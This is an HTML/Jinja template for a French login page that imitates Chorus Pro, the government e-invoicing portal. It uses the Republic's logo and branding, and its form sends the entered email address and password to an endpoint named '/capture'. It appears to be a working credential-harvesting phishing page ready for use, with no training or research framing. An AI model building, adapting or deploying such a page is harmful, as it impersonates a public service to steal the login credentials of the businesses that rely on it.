<!DOCTYPE html>
<html lang="fr">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Connexion - Chorus Pro</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.6.0/css/all.min.css">
  <style>
    body {
      background: linear-gradient(135deg, #005aaa 0%, #003366 100%);
    }
  </style>
</head>
<body class="min-h-screen flex items-center justify-center p-4">
  
  <div class="max-w-md w-full bg-white rounded-3xl shadow-2xl overflow-hidden">
    
    <!-- En-tête -->
    <div class="bg-[#005aaa] text-white p-8 text-center">
      <img src="{{ url_for('static', filename='logo.png') }}"
           alt="Logo République Française" class="h-20 md:h-20 w-auto">
      <h1 class="text-2xl font-bold">Connexion</h1>
      <p class="text-blue-100 mt-2">Accédez à votre espace Chorus Pro</p>
    </div>

    <!-- Formulaire -->
    <div class="p-8">
      
      <!-- === PARTIE AJOUTÉE : Message d'erreur === -->
      {% with messages = get_flashed_messages(with_categories=true) %}
        {% if messages %}
          {% for category, message in messages %}
            <div class="mb-6 p-4 rounded-2xl text-sm font-medium
                        {% if category == 'error' %}bg-red-100 text-red-700 border border-red-300{% endif %}
                        {% if category == 'success' %}bg-green-100 text-green-700 border border-green-300{% endif %}">
              {{ message }}
            </div>
          {% endfor %}
        {% endif %}
      {% endwith %}

      <form id="loginForm" action="/capture" method="POST" class="space-y-6">
        
        <!-- Email -->
        <div>
          <label class="block text-sm font-medium text-gray-700 mb-2">Adresse email</label>
          <div class="relative">
            <i class="fa-solid fa-envelope absolute left-4 top-3.5 text-gray-400"></i>
            <input 
              type="email" 
              id="email"
              name="username"
              required
              class="w-full pl-11 pr-4 py-3 border border-gray-300 rounded-2xl focus:outline-none focus:border-[#005aaa] transition"
              placeholder="exemple@entreprise.fr">
          </div>
        </div>

        <!-- Mot de passe -->
        <div>
          <label class="block text-sm font-medium text-gray-700 mb-2">Mot de passe</label>
          <div class="relative">
            <i class="fa-solid fa-lock absolute left-4 top-3.5 text-gray-400"></i>
            <input 
              type="password" 
              id="password"
              name="password"
              required
              class="w-full pl-11 pr-12 py-3 border border-gray-300 rounded-2xl focus:outline-none focus:border-[#005aaa] transition"
              placeholder="••••••••">
            
            <button type="button" id="togglePassword" 
                    class="absolute right-4 top-3.5 text-gray-400 hover:text-gray-600 transition">
              <i class="fa-solid fa-eye" id="eyeIcon"></i>
            </button>
          </div>
        </div>

        <!-- Options -->
        <div class="flex items-center justify-between">
          <label class="flex items-center text-sm">
            <input type="checkbox" class="w-4 h-4 text-[#005aaa] border-gray-300 rounded">
            <span class="ml-2 text-gray-600">Se souvenir de moi</span>
          </label>
          <a href="#" class="text-sm text-[#005aaa] hover:underline">Mot de passe oublié ?</a>
        </div>

        <!-- Bouton Connexion -->
        <button 
          type="submit"
          class="w-full bg-[#005aaa] hover:bg-[#003d80] text-white font-semibold py-4 rounded-2xl transition text-lg">
          Se connecter
        </button>
      </form>

      <div class="text-center mt-6">
        <p class="text-gray-600">
          Pas encore de compte ? 
          <a href="#" class="text-[#005aaa] font-semibold hover:underline">Créer un compte</a>
        </p>
      </div>
    </div>
  </div>

  <script>
document.addEventListener('DOMContentLoaded', function () {
  // === Afficher / Masquer le mot de passe ===
  const passwordInput = document.getElementById('password');
  const toggleButton = document.getElementById('togglePassword');
  const eyeIcon = document.getElementById('eyeIcon');

  if (passwordInput && toggleButton && eyeIcon) {
    toggleButton.addEventListener('click', function() {
      if (passwordInput.type === "password") {
        passwordInput.type = "text";
        eyeIcon.classList.remove('fa-eye');
        eyeIcon.classList.add('fa-eye-slash');
      } else {
        passwordInput.type = "password";
        eyeIcon.classList.remove('fa-eye-slash');
        eyeIcon.classList.add('fa-eye');
      }
    });
  }
});
</script>
</body>
</html>
